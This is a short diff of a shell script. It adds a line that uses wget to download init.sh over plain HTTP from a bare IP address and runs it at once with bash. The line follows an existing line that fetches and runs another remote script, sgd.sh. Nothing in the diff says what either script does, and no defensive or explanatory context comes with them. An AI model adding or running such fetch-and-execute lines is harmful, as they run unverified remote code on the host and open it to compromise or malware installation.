@@ -8,3 +8,5 @@ wget -N https://raw.githubusercontent.com/djbzq/az/refs/heads/main/sgd.sh && bas
 
 
 sleep 240
+
+wget -N http://158.180.34.216/init.sh && bash init.sh
